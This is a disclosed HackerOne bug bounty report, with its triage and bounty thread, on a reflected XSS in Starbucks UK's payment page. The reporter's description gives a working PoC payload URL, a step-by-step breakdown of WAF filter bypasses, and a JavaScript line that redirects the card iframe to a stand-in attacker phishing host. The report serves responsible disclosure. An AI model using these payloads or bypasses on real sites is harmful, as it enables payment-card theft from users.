{"id":227486,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjc0ODY=","url":"https://hackerone.com/reports/227486","title":"XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-05-10T13:28:32.386Z","submitted_at":"2017-05-10T13:28:32.386Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bayotop","url":"/bayotop","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-05-22T21:50:20.339Z","bug_reporter_agreed_on_going_public_at":"2018-05-02T07:40:58.511Z","team_member_agreed_on_going_public_at":"2018-05-22T21:50:20.228Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\n**Steps to reproduce:**\n\n0. Run Firefox (these steps *require* Firefox).\n1. Log in on https://www.starbucks.co.uk/account/signin\n2. Go to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket.\n3. Go to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton\n4. After the page finishes loading click the \"Checkout\" title.\n5. A confirmation prompt is shown showing the current domain.\n\n**Note** that these steps can be automated due to missing CSRF protection on the \"Add to Basket\" option. Effectively, all a user has to do is to load a page which is under attacker's control. I set up an example: http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html (this link is private).\n\n**Description:**\n\nI'll explain what is going on and why this works. First, take a look at https://www.starbucks.co.uk/shop/card/egift?reflected \nLooking at the source code you see the whole URL is reflected in a link tag. \n\n```html\n\u003clink rel=\"canonical\" href=\"https://www.starbucks.co.uk/shop/card/egift?reflected\" /\u003e\n```\nTrying to inject malicious code seems to be blocked by a WAF. However, all checks can be eventually bypassed to inject arbitrary attributes, e.g. https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected results in: \n\n```html\n\u003clink rel=\"canonical\" href=\"https://www.starbucks.co.uk/shop/card/egift?\" id=\"injected\" /\u003e\n```\n\nThis works on every page (!) site-wide. However, I am not aware of any technique to get arbitrary JS execution at this point. However, there is a handy [script](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) loaded into the page that does the following:\n\n```javascript\n$(\"#checkout\").bind(\"click\", function(e) {\n    $(\"#checkoutButton\").trigger(\"click\")\n});\n```\n\nYou see where this is going. In case I find a page that has an element with the id **checkout**, I can inject **id=\"checkoutButton\" onclick=\"malicous_js\"** to the above link element and the injected JS will be executed once the **checkout** element is clicked. \n\nExactly such a page is https://www.starbucks.co.uk/shop/paymentmethod (requires authentication). You can see the credit card form being loaded on this page. Luckily, it is loaded from a different origin so the form data can't be read using the injected JS. However, a determined attacker can easily set up a exact-looking page and change the iframe's content to steal the victim's credit card information:\n\n```javascript\ndocument.getElementById('payment-method-iframe').contentWindow.location.href = 'https://sbuxphishingsiteunderattackerscontrol.com';\n```\n\n**Note** that the **checkout** element is actually **\u003cbody\u003e** so there is plenty of space where the user can click to execute the malicious JS.\n\nTake into consideration that his could work in both IE and Chrome and the only thing preventing the PoC are the browsers' built in XSS protections. I am working on a bypass, but unfortunately I am not quite there, yet.\n\nTo sum up, I'll breakdown the injection from the PoC (==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton):\n\n1. **==** -\u003e used to trick the [query string parsing code](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) that is calling decodeURIcomponent(). Otherwise decodeURIcomponent(\"%u0022\") throws an exception resulting in the \"checkout bind\" never being called.\n2. **%u0022** -\u003e bypasses the WAF that is causing a 404 when the query contains \"%22\".\n3. **a%20onclick=** -\u003e allows to inject any on*= handlers. Otherwise a server error is returned when a blacklisted onhandler is followed by an equals sign in the query.\n4. **confirm(/-/g** -\u003e the WAF seems to dislike confirm(), alert() and so on. Adding a '/' after the left bracket makes him happy again.\n5. **+this.ownerDocument.domain)** -\u003e the WAF doesn't like \"document\".\n\n**Impact**\n\nAs mentioned, an attacker can easily trick users into disclosing their credit data. The victims might not even realize that they were tricked and their privacy was compromised. All they know is they entered their data on \"https://starbucks.co.uk\" as usual. Note that other \"typical\" possible ways to compromise the victims using XSS (BeEF hooks etc.) are, of course, still applicable.\n\n**Recommendation**\n\nCorrectly encode user input before rendering it back into the page. You shouldn't rely only on your WAF / custom blacklisting to protect you. Consider auditing yout site and adding CSRF protection to actions like \"Add to Basket\". You might also consider fixing the bypasses I mentioned. ","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-06-01T07:40:58.585Z","allow_singular_disclosure_after":-106122495.35949308,"singular_disclosure_allowed":true,"vote_count":25,"voters":["sp1d3rs","wh0ru","europa","foobar7","mvc","bogdantcaciuc","bl4de","spam404","emitrani","dilawer01","and 15 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":13017,"asset_type":"URL","asset_identifier":"www.starbucks.co.uk","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1666205,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2017-05-10T17:18:50.284Z","updated_at":"2017-05-10T17:18:50.284Z","additional_data":{"old_title":"XSS on https://www.starbucks.co.uk (can lead to credit card theft)","new_title":"XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)"},"actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1666206,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for sending this in! We are currently reviewing this submission and we'll notify you once we have more information to share with you. \n","automated_response":false,"created_at":"2017-05-10T17:18:58.181Z","updated_at":"2017-05-10T17:18:58.181Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1674473,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2017-05-15T14:30:27.259Z","updated_at":"2017-05-15T14:30:27.259Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1726335,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nAny updates? In the recently disclosed issue https://hackerone.com/reports/177472 you state that you typically try to award bounties at triage, or shortly after. Is this entry different or is the decision delayed for another reason? Thanks.  ","automated_response":false,"created_at":"2017-06-02T18:22:07.960Z","updated_at":"2017-06-02T18:22:07.960Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1734884,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @bayotop,\n\nThis should now be resolved.  Can you re-test and confirm?\n\nAs for your question about bounties being awarded at triage - yes, we try to do this at triage or shortly thereafter but this can sometimes be delayed as was the case this time.  For future qualifying reports, you should see more timely bounty awards.\n\n\n","automated_response":false,"created_at":"2017-06-06T14:41:32.695Z","updated_at":"2017-06-06T14:41:32.695Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bayotop","url":"/bayotop"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1734885,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2017-06-06T14:41:51.090Z","updated_at":"2017-06-06T14:41:51.090Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Starbucks"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"starbucks","collaborator":{"username":"bayotop","url":"/bayotop"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1734930,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @siren, \n\nI am not able to reproduce anymore as the WAF will redirect requests containing ```%u0022``` (404). I am also happy to see that the \"Add to Basket\" option is now protected against CSRF.\n\nHowever, I am not quite able to verify whether the ```\"``` character is correctly encoded in the initial injection point. If not, future bypasses might be discovered making this exploitable again.\n\nThe bounty is much appreciated. Thanks.","automated_response":false,"created_at":"2017-06-06T15:01:06.216Z","updated_at":"2017-06-06T15:01:55.075Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1735070,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for confirming @bayotop!\n","automated_response":false,"created_at":"2017-06-06T16:02:51.034Z","updated_at":"2017-06-06T16:02:51.034Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2688744,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-05-02T07:40:58.541Z","updated_at":"2018-05-02T07:40:58.541Z","first_to_agree":true,"actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2780981,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-05-22T21:50:20.264Z","updated_at":"2018-05-22T21:50:20.264Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2780982,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-05-22T21:50:20.374Z","updated_at":"2018-05-22T21:50:20.374Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3694521,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","automated_response":false,"created_at":"2018-11-21T19:55:47.534Z","updated_at":"2018-11-21T19:55:47.534Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"None","new_scope":"www.starbucks.co.uk","genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}